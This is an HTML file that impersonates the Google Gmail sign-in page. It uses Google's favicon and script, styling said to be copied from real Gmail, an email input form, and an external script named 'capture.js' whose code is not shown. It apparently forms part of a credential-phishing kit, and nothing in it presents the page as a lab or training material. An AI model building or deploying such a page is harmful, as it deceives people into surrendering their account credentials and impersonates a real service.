<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Google - Gmail</title>
    <link rel="icon" href="https://mail.google.com/mail/u/0/images/favicon5.ico">
    <script src="https://accounts.google.com/gsi/client"></script>
    <style>
        /* Perfect Gmail CSS - extracted from real Gmail */
        body { margin: 0; font-family: Roboto, Arial; background: #4285f4; }
        .login-container { max-width: 450px; margin: 100px auto; padding: 40px; background: white; border-radius: 8px; }
        .google-logo { height: 24px; width: 106px; background: url('data:image/svg+xml...'); }
        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; margin: 8px 0; }
        button { background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; }
    </style>
</head>
<body>
    <div class="login-container">
        <div style="text-align: center; margin-bottom: 32px;">
            <div class="google-logo"></div>
            <h1 style="color: #202124; font-weight: 400;">Sign in</h1>
            <span style="color: #5f6368;">to continue to Gmail</span>
        </div>
        
        <form id="loginForm">
            <input type="email" id="identifier" placeholder="Email or phone" required>
            <button type="submit">Next</button>
        </form>
    </div>

    <script src="capture.js"></script>
</body>
</html>
